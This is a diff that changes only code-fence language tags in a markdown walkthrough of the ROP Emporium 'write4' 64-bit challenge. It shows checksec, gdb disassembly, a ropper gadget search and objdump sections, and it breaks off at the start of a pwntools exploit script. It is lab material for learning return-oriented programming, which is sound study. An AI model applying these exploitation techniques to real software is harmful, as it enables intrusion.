@@ -1,6 +1,6 @@
 ## 64 bits
 
-```
+```bash
 $ checksec write4
 [*] '/home/localuser/ropemporium/write4/64bits/write4'
     Arch:     amd64-64-little
@@ -13,7 +13,7 @@ $ checksec write4
  
  Running the binary:
  
- ```
+ ```bash
  $ ./write4 
 write4 by ROP Emporium
 x86_64
@@ -26,7 +26,7 @@ Thank you!
  
  Now I'll open it on gdb and see the functions:
  
- ```
+ ```bash
  pwndbg> info func
 All defined functions:
 
@@ -50,7 +50,7 @@ Non-debugging symbols:
  
  The `main` function calls the `pwnme` function:
  
- ```
+ ```bash
  pwndbg> disassemble pwnme
 Dump of assembler code for function pwnme@plt:
    0x0000000000400500 <+0>:     jmp    QWORD PTR [rip+0x200b12]        # 0x601018 <pwnme@got.plt>
@@ -61,7 +61,7 @@ End of assembler dump.
  
  `pwnme` it's at plt, and there's `usefulGadgets` and `usefulFunction`:
  
- ```
+ ```bash
  pwndbg> disassemble usefulGadgets 
 Dump of assembler code for function usefulGadgets:
    0x0000000000400628 <+0>:     mov    QWORD PTR [r14],r15
@@ -82,7 +82,7 @@ End of assembler dump.
  
  Now i'll use ropper to find useful gadgets, and those are the importants:
  
- ```
+ ```bash
  $ ropper                                                                                                                                   
 (ropper)> file write4
 (write4/ELF/x86_64)> gadgets
@@ -97,7 +97,7 @@ End of assembler dump.
  
  Now we need somewhere to write, let's find it with `obdjump`:
  
- ```
+ ```bash
  $ objdump -h write4
  -----
  -----
@@ -113,7 +113,7 @@ End of assembler dump.
  
  The final exploit:
  
- ```
+ ```python
  from pwn import *
 
 p = process("./write4")
